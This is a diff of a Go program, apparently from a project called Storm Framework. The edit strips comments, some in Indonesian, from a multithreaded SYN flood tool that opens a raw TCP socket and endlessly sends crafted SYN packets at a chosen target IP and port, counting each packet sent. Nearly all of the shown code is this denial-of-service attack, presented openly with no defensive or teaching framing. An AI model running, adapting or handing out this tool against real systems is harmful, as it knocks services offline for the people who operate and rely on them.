@@ -1,8 +1,6 @@
 // MIT License.
 // Copyright (c) 2026 Storm Framework
-
 // See LICENSE file in the project root for full license information.
-
 package main
 import (
 	"flag"
@@ -25,8 +23,6 @@ func main() {
 		return
 	}
 
-	// Gunakan AF_INET dan SOCK_RAW dengan IPPROTO_TCP
-	// Di linux, ini adalah standar untuk bypass TCP stack
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
 	if err != nil {
 		fmt.Printf("[-] ERROR: RUN SUDO! (%v)\n", err)
@@ -38,7 +34,6 @@ func main() {
 
 	fmt.Printf("[!] Storm-OS SYN Flood: %s:%d | Threads: %d\n", *targetIP, *port, *threads)
 
-	// Counter logger
 	go func() {
 		for {
 			fmt.Printf("\r[*] SYN Packets Injected: %d", atomic.LoadUint64(&count))
@@ -49,27 +44,14 @@ func main() {
 	for i := 0; i < *threads; i++ {
 		go func() {
 			for {
-				// Membuat header TCP minimalis (20 bytes)
 				packet := make([]byte, 20)
-
-				// Source Port (Random 1024-65535)
 				srcPort := uint16(time.Now().UnixNano()%64511 + 1024)
 				packet[0], packet[1] = byte(srcPort>>8), byte(srcPort&0xff)
-
-				// Destination Port
 				packet[2], packet[3] = byte(*port>>8), byte(*port&0xff)
-
-				// Sequence Number (Random)
 				packet[4], packet[5], packet[6], packet[7] = 0x01, 0x02, 0x03, 0x04
-
-				// Data Offset (5 words = 20 bytes) & Flags (SYN = 0x02)
 				packet[12] = 0x50
 				packet[13] = 0x02
-
-				// Window Size
 				packet[14], packet[15] = 0x72, 0x10
-
-				// Kirim paket mentah
 				err := syscall.Sendto(fd, packet, 0, &addr)
 				if err == nil {
 					atomic.AddUint64(&count, 1)
